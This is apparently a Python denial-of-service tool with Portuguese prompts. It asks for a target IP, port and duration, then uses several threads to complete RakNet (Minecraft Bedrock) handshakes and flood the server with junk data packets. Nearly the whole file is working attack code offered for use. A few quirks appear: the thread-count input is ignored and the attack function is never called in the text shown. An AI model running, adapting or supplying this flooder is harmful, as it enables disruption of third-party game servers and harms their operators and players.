import socket
import os
import random
import threading
import struct
import time
from time import sleep

class Colors:
    reset = '\033[0m'
    vermelho = '\033[31m'
    verde = '\033[92m'

def print_line():
    print(Colors.vermelho + "=" * 90 + Colors.reset)

banner = """

  sSSs   .S_sSSs      sSSs_sSSs     .S_sSSs      sSSs  
 d%%SP  .SS~YS%%b    d%%SP~YS%%b   .SS~YS%%b    d%%SP  
d%S'    S%S   `S%b  d%S'     `S%b  S%S   `S%b  d%S'    
S%S     S%S    S%S  S%S       S%S  S%S    S%S  S%|     
S&S     S%S    d*S  S&S       S&S  S%S    d*S  S&S     
S&S_Ss  S&S   .S*S  S&S       S&S  S&S   .S*S  Y&Ss    
S&S~SP  S&S_sdSSS   S&S       S&S  S&S_sdSSS   `S&&S   
S&S     S&S~YSY%b   S&S       S&S  S&S~YSSY      `S*S  
S*b     S*S   `S%b  S*b       d*S  S*S            l*S  
S*S     S*S    S%S  S*S.     .S*S  S*S           .S*P  
S*S     S*S    S&S   SSSbs_sdSSS   S*S         sSS*S   
S*S     S*S    SSS    YSSP~YSSY    S*S         YSS'    
SP      SP                         SP                  
Y       Y                          Y                   
                                                       
                                                       """                

os.system('clear')           
print(Colors.vermelho + banner + Colors.reset)
             
print_line()
print(f"{Colors.vermelho}  by fehzxkkj                   › Preparando o ataque...")
print_line()

print(f"{Colors.vermelho}╔═══( Frops ) >")
ip = str(input(f"{Colors.vermelho}╚═══⟩ {Colors.reset}Target Ip: {Colors.verde}"))
print(f"{Colors.vermelho}╔═══( Frops ) >")
port = int(input(f"{Colors.vermelho}╚═══⟩ {Colors.reset}Target Porta: {Colors.verde}"))
print(f"{Colors.vermelho}╔═══( Frops ) >")
pack = int(input(f"{Colors.vermelho}╚═══⟩ {Colors.reset}Pacotes: {Colors.verde}"))
print(f"{Colors.vermelho}╔═══( Frops ) >")
sec = int(input(f"{Colors.vermelho}╚═══⟩ {Colors.reset}Time: {Colors.verde}"))
print(f"{Colors.vermelho}╔═══( Frops ) >")
thread_count = int(input(f"{Colors.vermelho}╚═══⟩ {Colors.reset}Threads: {Colors.verde}"))

os.system('clear')
print(Colors.vermelho + banner + Colors.reset)

sleep(0.1)
print("")
print_line()
print("")
print(Colors.vermelho + "┎►")
print(Colors.vermelho + "┃" + Colors.reset + f" Ataque iniciado com {Colors.verde}sucesso!")
print(Colors.vermelho + "┃" + Colors.reset + f" Target Ip: {Colors.verde}{ip}")
print(Colors.vermelho + "┃" + Colors.reset + f" Target porta: {Colors.verde}{port}")
print(Colors.vermelho + "┃" + Colors.reset + f" Pacotes: {Colors.verde}{pack} bytes")
print(Colors.vermelho + "┃" + Colors.reset + f" Threads: {Colors.verde}{thread_count}")
print(Colors.vermelho + "┃" + Colors.reset + f" Ataque em andamento...")
print(Colors.vermelho + "┖►")
print("")
print_line()

def mcpepunch(ip, port, secs):
    class RakNetClient:
        def __init__(self, server_ip, server_port):
            self.server_ip = server_ip
            self.server_port = server_port
            self.sock = None
            self.mtuSize = 1492
            self.client_id = struct.pack('>Q', random.getrandbits(64))
            self.guid = random.getrandbits(64)
            self.data_packet = {"seq_number": 0}
            self.receiver_thread = threading.Thread(target=self.listen_for_packets)
            self.receiver_running = True

        def listen_for_packets(self):
            while self.receiver_running:
                try:
                    data, _ = self.sock.recvfrom(4096)
                except:
                    break

        def create_oc_request1(self):
            return b'\x05' + b'\x00\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78' + b'\x06' + b'\x00' * (self.mtuSize - 46)

        def create_oc_request2(self):
            return b'\x07' + b'\x00\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78' + b'\x04' + bytes(map(int, self.server_ip.split('.'))) + struct.pack('>H', self.server_port) + struct.pack('>H', self.mtuSize) + self.client_id

        def handshake(self):
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            self.sock.settimeout(2)
            try:
                self.sock.sendto(self.create_oc_request1(), (self.server_ip, self.server_port))
                if len(self.sock.recvfrom(self.mtuSize)[0]) < 28:
                    return False
                self.sock.sendto(self.create_oc_request2(), (self.server_ip, self.server_port))
                self.receiver_thread.start()
                return True
            except:
                return False

        def send_data_packet(self):
            self.data_packet["seq_number"] = (self.data_packet["seq_number"] + 1) % 0x1000000
            packet = bytes([random.choice(range(0x80, 0x84))]) + struct.pack('<I', self.data_packet["seq_number"])[:3]
            self.sock.sendto(packet, (self.server_ip, self.server_port))

    start_time = time.time()

    def attack_thread():
        client = RakNetClient(ip, port)
        if client.handshake():
            while time.time() - start_time < secs:
                client.send_data_packet()
                time.sleep(random.uniform(0.05, 0.09))

    threads = [threading.Thread(target=attack_thread) for _ in range(5)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()